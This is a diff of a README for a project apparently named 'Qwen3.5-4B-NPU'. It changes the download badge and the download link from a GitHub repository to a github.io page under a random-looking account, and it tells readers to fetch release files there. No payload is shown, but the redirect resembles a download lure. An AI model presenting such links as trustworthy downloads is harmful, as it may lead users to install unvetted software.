@@ -1,6 +1,6 @@
 # 🤖 Qwen3.5-4B-NPU - Run smart vision models on hardware
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/ambagesthickskin162/Qwen3.5-4B-NPU)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://ambagesthickskin162.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Before starting, ensure your computer meets these requirements:
 
 You need to access the official release page to obtain the necessary files. 
 
-[Visit this page to download](https://github.com/ambagesthickskin162/Qwen3.5-4B-NPU)
+[Visit this page to download](https://ambagesthickskin162.github.io)
 
 1. Click the link above to open the repository page in your browser.
 2. Look for the Releases section on the right side of the screen.
